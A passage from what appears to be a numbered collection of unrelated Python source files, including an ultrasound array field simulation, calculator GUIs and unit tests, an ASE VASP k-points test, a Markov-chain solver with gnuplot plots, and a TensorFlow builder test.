array.switch_off_elements_from_file(ur\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\HandOffElements.txt\")\r\n\t# array.switch_off_elements_from_file(ur\"d:\\Downloads Projects\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0434\u043b\u044f \u0441\u0442\u0430\u0442\u044c\u0438\\switched_off.txt\")\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\t# calc_field.set_nodes_num(341, 341, 1)\r\n\t# calc_field.set_grid_bottom(-85.0e-03, -85.0e-03, 45.0e-03)\r\n\t# calc_field.set_grid_top(85.0e-03, 85.0e-03, 45.0e-03)\r\n\tcalc_field.set_nodes_num(1, 1, 1001)\r\n\tcalc_field.set_grid_bottom(0.0e-03, 0.0e-03, 100.0e-03)\r\n\tcalc_field.set_grid_top(0.0e-03, 0.0e-03, 150.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\t# # calc_field = field.PressureFieldCartesian()\r\n\t# # calc_field.set_nodes_num(1, 121, 121)\r\n\t# # calc_field.set_grid_bottom(0.0e-03, -60.0e-03, 70.0e-03)\r\n\t# # calc_field.set_grid_top(0.0e-03, 60.0e-03, 190.0e-03)\r\n\t# # calc_field.prepare_grid()\r\n\r\n\t# array.set_focus_from_file(r\"d:\\Educ\\\u0410\u041a\u0423\u0421\u0422\u0418\u041a\u0410\\.Current\\\u0420\u0430\u0441\u0447\u0435\u0442 \u0430\u043a \u043f\u043e\u043b\u044f \u0440\u0435\u0448\u0435\u0442\u043a\u0438\\CalcPy\\focus.txt\")\r\n\r\n\t# # -------------------------CALCULATIONS-----------------------------------------\r\n\t# analytic_calc.calc_field_analytically(calc_field, array, med)\r\n\trayleigh.calc_field_from_trans_opt(calc_field, array, med, 1000)\r\n\toutput.save_field_on_disk(calc_field, \"field_Z\")\r\n\t# output.PrintCylAmpPhaseZ_Binary(calc_field, 1, 1)\r\n\r\n\r\ndef main_y():\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"array.txt\")\r\n\tarray.add_elements_from_file(r\"array_elements.txt\")\r\n\tmed = medium.medium_from_file(r\"water_medium.txt\")\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\tcalc_field.set_nodes_num(1, 401, 1)\r\n\tcalc_field.set_grid_bottom(0.0e-03, -100.0e-03, 45.0e-03)\r\n\tcalc_field.set_grid_top(0.0e-03, 100.0e-03, 45.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\tribs_phantom = {\r\n\t# \u0420\u0435\u0431\u0440\u0430 - \u043f\u043b\u043e\u0441\u043a\u0438\u0435 \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u043e\u043b\u043e\u0441\u043a\u0438 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e\u0439 \u0442\u043e\u043b\u0449\u0438\u043d\u044b\r\n\t\r\n\t# \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0434\u043e \u043f\u043b\u043e\u0441\u043a\u043e\u0441\u0442\u0438 \u0440\u0435\u0431\u0435\u0440 \u043e\u0442 \u0440\u0435\u0448\u0435\u0442\u043a\u0438\r\n\t'dist_to_ribs_plane': 45.0e-03,\r\n\r\n\t# \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0435\u0431\u0435\u0440\r\n\t'ribs_count': 5,\r\n\r\n\t# \u0428\u0438\u0440\u0438\u043d\u0430 \u0440\u0435\u0431\u0440\u0430\r\n\t'rib_width': 18.0e-03,\r\n\r\n\t# \u0428\u0438\u0440\u0438\u043d\u0430 \u0449\u0435\u043b\u0438 \u043c\u0435\u0436\u0434\u0443 \u0440\u0435\u0431\u0440\u0430\u043c\u0438\r\n\t'gap_width': 14.0e-03,\r\n\r\n\t# \u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 Y \u043d\u0438\u0436\u043d\u0435\u0439 \u0433\u0440\u0430\u043d\u0438 \u043d\u0438\u0436\u043d\u0435\u0433\u043e \u0440\u0435\u0431\u0440\u0430\r\n\t'bottom_coord': 14.0e-03\r\n\t}\r\n\t\r\n\t# ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n\tarray.switch_off_elements_from_file(r\"switched_off.txt\")\r\n\tanalytic_calc.calc_field_analytically(calc_field, array, med)\r\n\toutput.save_field_on_disk(calc_field, \"field_2\")\r\n\r\ndef ribs_calc():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"..\\array.txt\")\r\n\tarray.add_elements_from_file(r\"..\\array_elements.txt\")\r\n\tmed = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n\tribs_phantom = {\r\n\t# \u0420\u0435\u0431\u0440\u0430 - \u043f\u043b\u043e\u0441\u043a\u0438\u0435 \u0433\u043e\u0440\u0438\u0437\u043e\u043d\u0442\u0430\u043b\u044c\u043d\u044b\u0435 \u043f\u043e\u043b\u043e\u0441\u043a\u0438 \u043e\u0434\u0438\u043d\u0430\u043a\u043e\u0432\u043e\u0439 \u0442\u043e\u043b\u0449\u0438\u043d\u044b\r\n\t\r\n\t# \u0420\u0430\u0441\u0441\u0442\u043e\u044f\u043d\u0438\u0435 \u0434\u043e \u043f\u043b\u043e\u0441\u043a\u043e\u0441\u0442\u0438 \u0440\u0435\u0431\u0435\u0440 \u043e\u0442 \u0440\u0435\u0448\u0435\u0442\u043a\u0438\r\n\t'dist_to_ribs_plane': 45.0e-03,\r\n\t# 'dist_to_ribs_plane': 65.0e-03,\r\n\r\n\t# \u041a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0440\u0435\u0431\u0435\u0440\r\n\t'ribs_count': 5,\r\n\r\n\t# \u0428\u0438\u0440\u0438\u043d\u0430 \u0440\u0435\u0431\u0440\u0430\r\n\t'rib_width': 18.0e-03,\r\n\r\n\t# \u0428\u0438\u0440\u0438\u043d\u0430 \u0449\u0435\u043b\u0438 \u043c\u0435\u0436\u0434\u0443 \u0440\u0435\u0431\u0440\u0430\u043c\u0438\r\n\t'gap_width': 14.0e-03,\r\n\r\n\t# \u041a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u0430 Y \u043d\u0438\u0436\u043d\u0435\u0439 \u0433\u0440\u0430\u043d\u0438 \u043d\u0438\u0436\u043d\u0435\u0433\u043e \u0440\u0435\u0431\u0440\u0430\r\n\t'bottom_coord': 14.0e-03\r\n\t}\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\tcalc_field.set_nodes_num(201, 201, 1)\r\n\tcalc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n\tcalc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n\t# calc_field.set_nodes_num(341, 341, 1)\r\n\t# calc_field.set_grid_bottom(-85.0e-03, -85.0e-03, 45.0e-03)\r\n\t# calc_field.set_grid_top(85.0e-03, 85.0e-03, 45.0e-03)\r\n\t# calc_field.set_nodes_num(1000, 1000, 1)\r\n\t# calc_field.set_grid_bottom(-100.0e-03, -100.0e-03, 45.0e-03)\r\n\t# calc_field.set_grid_top(100.0e-03, 100.0e-03, 45.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\t# ribs.create_switched_off_elements_file(ribs_phantom, array, \"switched_off.txt\")\r\n\t# array.switch_off_elements_from_file(r\"switched_off.txt\")\r\n\t\r\n\t# analytic_calc.calc_field_analytically(calc_field, array, med)\r\n\t# rayleigh.calc_field_from_trans_opt(calc_field, array, med, 300)\r\n\t\r\n\trayleigh.calc_field_from_trans_opt_ideal_trans(calc_field, array, med, 2000, ribs_phantom)\r\n\t# rayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\r\n\t\r\n\t# calc_field = output.restore_field_from_disk(\"field_plane\")\r\n\toutput.save_field_on_disk(calc_field, \"field_plane\")\r\n\tribs.CalcPowerOnRibs(calc_field, ribs_phantom)\r\n\r\ndef main_num_test():\r\n\tnew_work_dir_with_time_stamp()\r\n\tprepare_logging()\r\n\r\n\tarray = transducer.transducer_from_file(r\"..\\array.txt\")\r\n\tmed = medium.medium_from_file(r\"..\\water_medium.txt\")\r\n\r\n\tcalc_field = field.PressureFieldCartesian()\r\n\t# calc_field.set_nodes_num(501, 1, 1)\r\n\t# calc_field.set_grid_bottom(-30.0e-03, 0.0e-03, 130.0e-03)\r\n\t# calc_field.set_grid_top(30.0e-03, 0.0e-03, 130.0e-03)\r\n\tcalc_field.set_nodes_num(1, 1, 1623)\r\n\tcalc_field.set_grid_bottom(0.0e-03, 0.0e-03, 30.0e-03)\r\n\tcalc_field.set_grid_top(0.0e-03, 0.0e-03, 232.0e-03)\r\n\tcalc_field.prepare_grid()\r\n\r\n\trayleigh.calc_field_from_trans_opt_full(calc_field, array, med, 300)\r\n\t# rayleigh.reference_anal_calc_in_focal_plane(calc_field, array, med)\r\n\t# rayleigh.reference_anal_calc_on_axis(calc_field, array, med)\r\n\toutput.save_field_on_disk(calc_field, \"field_plane\")\r\n\r\n\r\ndef prepare_logging():\r\n\tlogging.basicConfig(\r\n\t\tfilename='log.txt',\r\n\t\tfilemode='w',\r\n\t\tformat='%(asctime)s %(message)s',\r\n\t\tdatefmt='%Y/%m/%d %H:%M:%S',\r\n\t\tlevel=logging.INFO\r\n\t\t)\r\n\tconsole = logging.StreamHandler(stream=sys.stdout)\r\n\tconsole.setLevel(logging.INFO)\r\n\tconsole.setFormatter(logging.Formatter('%(message)s'))\r\n\tlogging.getLogger('').addHandler(console)\r\n\r\n\r\ndef new_work_dir_with_time_stamp():\r\n\tpath = os.getcwd()\r\n\tpath += \"\\\\\"+ time.strftime(\"%Y-%m-%d_%H-%M-%S\", time.localtime())\r\n\tos.mkdir(path)\r\n\tos.chdir(path)\r\n\r\n\r\nif __name__ == '__main__':\r\n\t# import cProfile\r\n\t# cProfile.run('test_opt()')\r\n\t# test_opt()\r\n\t# tpx_new_scheme_interfaces()\r\n\t# rexolite_old_scheme_interfaces()\r\n\t# ellipse_interfaces()\r\n\t# main()\r\n\tribs_calc()\r\n\t# main_num_test()\r\n\t# main_y()\r\n\t# main_one_el()\r\n\t# main_1d()\r\n\t# main_test_num()\r\n", "421": "from .parameter_calculation import (\r\n    calc_asset_returns, calc_asset_obsrvd_returns, calc_asset_obsrvd_risks, calc_corr_cf,\r\n    calc_asset_expctd_returns, calc_asset_expctd_risks,\r\n    calc_prtfl_obsrvd_return, calc_prtfl_obsrvd_risk,\r\n)\r\nfrom .parameter_setting import read_params\r\nfrom .plotting import plot\r\n\r\n__all__ = [\r\n    \"calc_asset_returns\",\r\n    \"calc_asset_obsrvd_returns\",\r\n    \"calc_asset_obsrvd_risks\",\r\n    \"calc_corr_cf\",\r\n    \"calc_asset_expctd_returns\",\r\n    \"calc_asset_expctd_risks\",\r\n    \"calc_prtfl_obsrvd_return\",\r\n    \"calc_prtfl_obsrvd_risk\",\r\n    \"read_params\",\r\n    \"plot\",\r\n]\r\n", "422": "import tkinter as tk\n\nwindow = tk.Tk()\n\nlbl_calc_result = tk.Label(\n    master= window,\n    text= '0',\n    width= 30,\n    height=3,\n)\nlbl_calc_result.grid(row=0, column=0 , columnspan=4)\n\ndef insert_number_in_calc_result(button_number):\n    lbl_calc_result['text'] = button_number\n\ncalc_list = [\n    {\n        'text' : '7',\n        'command' : lambda:insert_number_in_calc_result('7'),\n    },\n    {\n        'text' : '8',\n        'command' : lambda:insert_number_in_calc_result('8'),\n    },\n    {\n        'text' : '9',\n        'command' : lambda:insert_number_in_calc_result('9'),\n    },\n    {\n        'text' : '+',\n        'command' : lambda:insert_number_in_calc_result('+'),\n    },\n        {\n        'text' : '4',\n        'command' : lambda:insert_number_in_calc_result('4'),\n    },\n    {\n        'text' : '5',\n        'command' : lambda:insert_number_in_calc_result('5'),\n    },\n    {\n        'text' : '6',\n        'command' : lambda:insert_number_in_calc_result('6'),\n    },\n    {\n        'text' : '-',\n        'command' : lambda:insert_number_in_calc_result('-'),\n    },\n            {\n        'text' : '1',\n        'command' : lambda:insert_number_in_calc_result('1'),\n    },\n    {\n        'text' : '2',\n        'command' : lambda:insert_number_in_calc_result('2'),\n    },\n    {\n        'text' : '3',\n        'command' : lambda:insert_number_in_calc_result('3'),\n    },\n    {\n        'text' : '*',\n        'command' : lambda:insert_number_in_calc_result('*'),\n    },\n                {\n        'text' : '.',\n        'command' : lambda:insert_number_in_calc_result('.'),\n    },\n    {\n        'text' : '0',\n        'command' : lambda:insert_number_in_calc_result('0'),\n    },\n    {\n        'text' : 'C',\n        'command' : lambda:insert_number_in_calc_result('C'),\n    },\n    {\n        'text' : '=',\n        'command' : lambda:insert_number_in_calc_result('='),\n    },\n    \n]\n\ncalc_key_objs = []\n\nfor calc_key_data in calc_list:\n    btn = tk.Button(\n        master= window,\n        text=calc_key_data['text'],\n        command=calc_key_data['command'],\n        height=3,\n    )\n    calc_key_objs.append(btn)\n\nfor i, calc_key_obj in enumerate(calc_key_objs):\n    calc_key_obj.grid(row=(i//4)+1, column=i%4, sticky='nsew')\n\n\n# btn7 = tk.Button(\n#     master= window,\n#     text='7',\n#     command= lambda: print('7'),\n#     height=3,\n# )\n# btn7.grid(row=1 , column=0, sticky='ewsn')\n\n\nwindow.mainloop()\n", "423": "import unittest\nimport calc\n\n\nclass TestCalc(unittest.TestCase):\n\n    def test_add(self):\n        self.assertEqual(calc.add(10, 5), 15)\n        self.assertEqual(calc.add(-1, 1), 0)\n        self.assertEqual(calc.add(-1, -1), -2)\n\n    def test_subtract(self):\n        self.assertEqual(calc.subtract(10, 5), 5)\n        self.assertEqual(calc.subtract(-1, 1), -2)\n        self.assertEqual(calc.subtract(-1, -1), 0)\n\n    def test_multiply(self):\n        self.assertEqual(calc.multiply(10, 5), 50)\n        self.assertEqual(calc.multiply(-1, 1), -1)\n        self.assertEqual(calc.multiply(-1, -1), 1)\n\n    def test_divide(self):\n        self.assertEqual(calc.divide(10, 5), 2)\n        self.assertEqual(calc.divide(-1, 1), -1)\n        self.assertEqual(calc.divide(-1, -1), 1)\n        self.assertEqual(calc.divide(5, 2), 2.5)\n\n        with self.assertRaises(ValueError):\n            calc.divide(10, 0)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "424": "\"\"\"\n\nCheck the many ways of specifying KPOINTS\n\n\"\"\"\n\nimport os\nimport filecmp\n\nfrom ase.calculators.vasp import Vasp\nfrom ase.build import bulk\n\nAl = bulk('Al', 'fcc', a=4.5, cubic=True)\n\n\ndef check_kpoints_line(n, contents):\n    \"\"\"Assert the contents of a line\"\"\"\n    with open('KPOINTS', 'r') as f:\n        lines = f.readlines()\n        assert lines[n] == contents\n\n# Default to (1 1 1)\n\ncalc = Vasp(gamma=True)\ncalc.write_kpoints()\ncheck_kpoints_line(2, 'Gamma\\n')\ncheck_kpoints_line(3, '1 1 1 \\n')\ncalc.clean()\n\n# 3-tuple prints mesh\ncalc = Vasp(gamma=False, kpts=(4, 4, 4))\ncalc.write_kpoints()\ncheck_kpoints_line(2, 'Monkhorst-Pack\\n')\ncheck_kpoints_line(3, '4 4 4 \\n')\ncalc.clean()\n\n# Auto mode\ncalc = Vasp(kpts=20)\ncalc.write_kpoints()\ncheck_kpoints_line(1, '0\\n')\ncheck_kpoints_line(2, 'Auto\\n')\ncheck_kpoints_line(3, '20 \\n')\ncalc.clean()\n\n# 1-element list ok, Gamma ok\ncalc = Vasp(kpts=[20], gamma=True)\ncalc.write_kpoints()\ncheck_kpoints_line(1, '0\\n')\ncheck_kpoints_line(2, 'Auto\\n')\ncheck_kpoints_line(3, '20 \\n')\ncalc.clean()\n\n# KSPACING suppresses KPOINTS file\ncalc = Vasp(kspacing=0.23)\ncalc.initialize(Al)\ncalc.write_kpoints()\ncalc.write_incar(Al)\nassert not os.path.isfile('KPOINTS')\nwith open('INCAR', 'r') as f:\n    assert ' KSPACING = 0.230000\\n' in f.readlines()\ncalc.clean()\n\n# Negative KSPACING raises an error\ncalc = Vasp(kspacing=-0.5)\n\ntry:\n    calc.write_kpoints()\nexcept ValueError:\n    pass\nelse:\n    raise AssertionError(\"Negative KSPACING did not raise ValueError\")\ncalc.clean()\n\n# Explicit weighted points with nested lists, Cartesian if not specified\ncalc = Vasp(\n    kpts=[[0.1, 0.2, 0.3, 2], [0.0, 0.0, 0.0, 1], [0.0, 0.5, 0.5, 2]])\ncalc.write_kpoints()\n\nwith open('KPOINTS.ref', 'w') as f:\n    f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n3 \nCartesian\n0.100000 0.200000 0.300000 2.000000 \n0.000000 0.000000 0.000000 1.000000 \n0.000000 0.500000 0.500000 2.000000 \n\"\"\")\n\nassert filecmp.cmp('KPOINTS', 'KPOINTS.ref')\nos.remove('KPOINTS.ref')\n\n# Explicit points as list of tuples, automatic weighting = 1.\ncalc = Vasp(\n    kpts=[(0.1, 0.2, 0.3), (0.0, 0.0, 0.0), (0.0, 0.5, 0.5)], reciprocal=True)\ncalc.write_kpoints()\n\nwith open('KPOINTS.ref', 'w') as f:\n    f.write(\"\"\"KPOINTS created by Atomic Simulation Environment\n3 \nReciprocal\n0.100000 0.200000 0.300000 1.0 \n0.000000 0.000000 0.000000 1.0 \n0.000000 0.500000 0.500000 1.0 \n\"\"\")\n\nassert filecmp.cmp('KPOINTS', 'KPOINTS.ref')\nos.remove('KPOINTS.ref')\n", "425": "import math\nimport PyGnuplot as gp\n\n\ndef C(n, k):\n    return math.factorial(n)/(math.factorial(n-k)*math.factorial(k))\n\n\nclass Solver:\n\n    def __init__(self, a, b, n):\n        assert a > 0 and a < 1 and b > 0 and b < 1 and n >= 1\n        self.a = a\n        self.b = b\n        self.inA = 1 - a\n        self.inB = 1 - b\n        self.n = n\n        self.count = 0\n        self.q = [None for i in range(n+1)]\n        self.q[n] = 1\n\n    def reload(self, a, b, n):\n        assert a > 0 and a < 1 and b > 0 and b < 1 and n >= 1\n        self.a = a\n        self.b = b\n        self.inA = 1 - a\n        self.inB = 1 - b\n        self.n = n\n        self.q = [None for i in range(n+1)]\n        self.q[n] = 1\n    # -------------------------1st----------------------------\n    def calc_pij(self, i, j):\n        if j == 0:\n            return self.inA*self.b**i\n        elif j == i+1 and i < self.n:\n            return self.a*self.inB**i\n        elif i == self.n and j == self.n:\n            return self.inB**self.n + self.a*C(self.n, 1)*self.inB**(self.n-1)*self.b\n        else:\n            return self.inA*C(i, j)*(self.inB**j)*self.b**(i-j) + self.a * C(i, j-1) * (self.inB**(j-1))*self.b**(i-j+1)\n\n    def calc_Pij(self, i, j):\n        res = 0\n        assert i >= 1 and i <= self.n and j >= 0 and j <= i-1\n        for k in range(0, j+1):\n            res += self.calc_pij(i, k)\n        return res\n\n    def calc_qi(self, i):\n        if self.q[i]:\n            return self.q[i]\n        else:\n            tmp = 0\n            for j in range(self.n, i, -1):\n                tmp += self.calc_qi(j)*self.calc_Pij(j, i)\n            self.q[i] = tmp/self.calc_pij(i, i+1)\n            return self.q[i]\n\n    def calc_pi(self, i):\n        assert i >= 0 and i <= self.n\n        if i == self.n:\n            tmp = 0\n            for k in range(0, self.n):\n                tmp += self.calc_qi(k)\n            return 1/(1+tmp)\n        else:\n            return self.calc_pi(self.n) * self.calc_qi(i)\n\n    def calc_pxji(self, j, i):\n        return C(j, i) * self.inB**i * self.b**(j-i)\n\n    def calc_pxi(self, i):\n        sum = 0\n        for j in range(i, self.n+1):\n            sum += self.calc_pi(j)*self.calc_pxji(j, i)\n        return sum\n\n    # -------------------------2nd----------------------------\n\n    def calc_special_pi(self):\n        return self.calc_pxi(self.n)\n\n    def calc_N(self):\n        res = 0\n        for i in range(self.n+1):\n            res += i * self.calc_pi(i)\n        return res\n\n    def calc_Nx(self):\n        res = 0\n        for i in range(self.n+1):\n            res += i * self.calc_pxi(i)\n        return res\n\n    def calc_VarN(self):\n        res = 0\n        for i in range(self.n+1):\n            res += (i - self.calc_N())**2*self.calc_pi(i)\n        return res\n\n    def calc_VarNx(self):\n        res = 0\n        for i in range(self.n+1):\n            res += (i - self.calc_Nx())**2*self.calc_pxi(i)\n        return res\n\n\nclass Graphics():\n\n    def _draw(self,\n             points, # ([x1,y1],filename,functionname), ...\n             xl='\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u044f a',\n             yl='\u0417\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u0444\u0443\u043d\u043a\u0446\u0438\u0438',\n             title='\u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043e\u043a',\n             yrange='[0:5]',\n             xrange='[-1:1]',\n             out_file='file.pdf'):\n        gp.c('set xlabel \"' + xl + '\"')\n        gp.c('set ylabel \"' + yl + '\"')\n        gp.c('set title \"' + title + '\"')\n        gp.c('set yrange ' + yrange)\n        gp.c('set xrange ' + xrange)\n        plotstr = 'plot '\n        for q in points:\n            gp.s([q[0][0], q[0][1]], filename=q[1])\n            plotstr += '\"' + q[1] + '\" u 1:2 w l title \"' + q[2] + '\", '\n        plotstr = plotstr.strip(', ')\n        gp.c(plotstr)\n        # print(plotstr)\n        # gp.pdf(\"out.pdf\")\n\n    def draw_N_Nx(self, a, b, n, da=0.001):\n        s = Solver(a, b, n)\n        x1 = []\n        y1 = []\n        x2 = []\n        y2 = []\n        while a < 1-da:\n            x1.append(a)\n            x2.append(a)\n            y1.append(s.calc_N())\n            y2.append(s.calc_Nx())\n            a += da\n            s.reload(a, b, n)\n        points = []\n        points.append(((x1, y1), 'tmp.dat', 'N(a)'))\n        points.append(((x2, y2), 'tmp2.dat', 'N*(a)'))\n        self._draw(points=points,\n                   title=\"\u0413\u0440\u0430\u0444\u0438\u043a \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 N(a) \u0438 N*(a)\",\n                   )\n\n    def draw_VarN_VarNx(self, a, b, n, da=0.001):\n        s = Solver(a, b, n)\n        x1 = []\n        y1 = []\n        x2 = []\n        y2 = []\n        while a < 1-da:\n            print(a)\n            x1.append(a)\n            x2.append(a)\n            y1.append(s.calc_VarN())\n            y2.append(s.calc_VarNx())\n            a += da\n            s.reload(a, b, n)\n        points = []\n        points.append(((x1, y1), 'tmp.dat', 'VarN(a)'))\n        points.append(((x2, y2), 'tmp2.dat', 'VarN*(a)'))\n        self._draw(points=points,\n                   title=\"\u0413\u0440\u0430\u0444\u0438\u043a \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 VarN(a) \u0438 VarN*(a)\",\n                   )\n\n    def draw_special_pi(self, a, b, n, da=0.001):\n        s = Solver(a, b, n)\n        x1 = []\n        y1 = []\n        while a < 1-da:\n            print(a)\n            x1.append(a)\n            y1.append(s.calc_special_pi())\n            a += da\n            s.reload(a, b, n)\n        points = []\n        points.append(((x1, y1), 'tmp.dat', 'p*n(a)'))\n        self._draw(points=points,\n                   title=\"\u0413\u0440\u0430\u0444\u0438\u043a \u0437\u0430\u0432\u0438\u0441\u0438\u043c\u043e\u0441\u0442\u0438 VarN(a) \u0438 VarN*(a)\",\n                   )\n", "426": "# Copyright 2017 The TensorFlow Authors. All Rights Reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n# ==============================================================================\n\n\"\"\"Tests for region_similarity_calculator_builder.\"\"\"\n\nimport tensorflow as tf\n\nfrom google.protobuf import text_format\nfrom object_detection.builders import region_similarity_calculator_builder\nfrom object_detection.core import region_similarity_calculator\nfrom object_detection.protos import region_similarity_calculator_pb2 as sim_calc_pb2\n\n\nclass RegionSimilarityCalculatorBuilderTest(tf.test.TestCase):\n\n  def testBuildIoaSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      ioa_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IoaSimilarity))\n\n  def testBuildIouSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      iou_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.IouSimilarity))\n\n  def testBuildNegSqDistSimilarityCalculator(self):\n    similarity_calc_text_proto = \"\"\"\n      neg_sq_dist_similarity {\n      }\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "427": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"\n@Author  : Ryan Fan \n@E-Mail  : ryanfan0528@gmail.com\n@Version : v1.0\n\"\"\"\n\nimport os\nimport time\nimport sys\nimport re\nimport datetime\nimport pandas as pd \nimport numpy as np\n\nTRAIN_FILE = \"data/train.csv\"\nTEST_FILE = \"data/test.csv\"\n\nSUB_DIR = \"output\"\n\n\nNUM_SPLITS = 3\nRANDOM_SEED = 2017\n\n# types of columns of the dataset dataframe\nCATEGORICAL_COLS = [\n    'ps_ind_02_cat', 'ps_ind_04_cat', 'ps_ind_05_cat',\n    'ps_car_01_cat', 'ps_car_02_cat', 'ps_car_03_cat',\n    'ps_car_04_cat', 'ps_car_05_cat', 'ps_car_06_cat',\n    'ps_car_07_cat', 'ps_car_08_cat', 'ps_car_09_cat',\n    'ps_car_10_cat', 'ps_car_11_cat',\n]\n\nNUMERIC_COLS = [\n    # # binary\n    # \"ps_ind_06_bin\", \"ps_ind_07_bin\", \"ps_ind_08_bin\",\n    # \"ps_ind_09_bin\", \"ps_ind_10_bin\", \"ps_ind_11_bin\",\n    # \"ps_ind_12_bin\", \"ps_ind_13_bin\", \"ps_ind_16_bin\",\n    # \"ps_ind_17_bin\", \"ps_ind_18_bin\",\n    # \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    # \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\",\n    # numeric\n    \"ps_reg_01\", \"ps_reg_02\", \"ps_reg_03\",\n    \"ps_car_12\", \"ps_car_13\", \"ps_car_14\", \"ps_car_15\",\n\n    # feature engineering\n    \"missing_feat\", \"ps_car_13_x_ps_reg_03\",\n]\n\nIGNORE_COLS = [\n    \"id\", \"target\",\n    \"ps_calc_01\", \"ps_calc_02\", \"ps_calc_03\", \"ps_calc_04\",\n    \"ps_calc_05\", \"ps_calc_06\", \"ps_calc_07\", \"ps_calc_08\",\n    \"ps_calc_09\", \"ps_calc_10\", \"ps_calc_11\", \"ps_calc_12\",\n    \"ps_calc_13\", \"ps_calc_14\",\n    \"ps_calc_15_bin\", \"ps_calc_16_bin\", \"ps_calc_17_bin\",\n    \"ps_calc_18_bin\", \"ps_calc_19_bin\", \"ps_calc_20_bin\"\n]", "428": "import unittest\nimport calc\n\n\nclass TestCalc(unittest.TestCase):\n\n    def test_add(self):\n        self.assertEqual(calc.add(10, 5), 15)\n        self.assertEqual(calc.add(-1, 1), 0)\n        self.assertEqual(calc.add(-1, -1), -2)\n\n    def test_subtract(self):\n        self.assertEqual(calc.subtract(10, 5), 5)\n        self.assertEqual(calc.subtract(-1, 1), -2)\n        self.assertEqual(calc.subtract(-1, -1), 0)\n\n    def test_multiply(self):\n        self.assertEqual(calc.multiply(10, 5), 50)\n        self.assertEqual(calc.multiply(-1, 1), -1)\n        self.assertEqual(calc.multiply(-1, -1), 1)\n\n    def test_divide(self):\n        self.assertEqual(calc.divide(10, 5), 2)\n        self.assertEqual(calc.divide(-1, 1), -1)\n        self.assertEqual(calc.divide(-1, -1), 1)\n        self.assertEqual(calc.divide(5, 2), 2.5)\n\n        with self.assertRaises(ValueError):\n            calc.divide(10, 0)\n\n\nif __name__ == '__main__':\n    unittest.main()\n", "429": "import math\nimport numpy as np\nfrom math import radians\nnum_1 = int (input (\"Please enter the first number: \"))\ncalc = input(\"Please enter calc (+,-,*,/,/*,**,sin,cos,tan,sinh,tanh,cosh,asin,acos,atan,asinh,accosh,atanh,log,exp,sqrt,degrees,radians,factorial,cbrt): \")    \n\nif calc in ('+','-','*','/','/*','**'): \n    num_2 = int (input (\"Please enter the second number: \"))\n    \nif calc == '+':\n        print (num_1, \" + \", num_2, \" = \", num_1+num_2)\nelif calc == '-':\n        print (num_1, \" - \", num_2, \" = \", num_1-num_2)     \nelif calc == '*':\n        print (num_1, \" * \", num_2, \" = \", num_1*num_2)    \nelif calc == '/':\n    print (num_1, \" / \", num_2, \" = \",num_1/num_2)   \nelif calc == '/*':\n    print (num_1, \" / \", 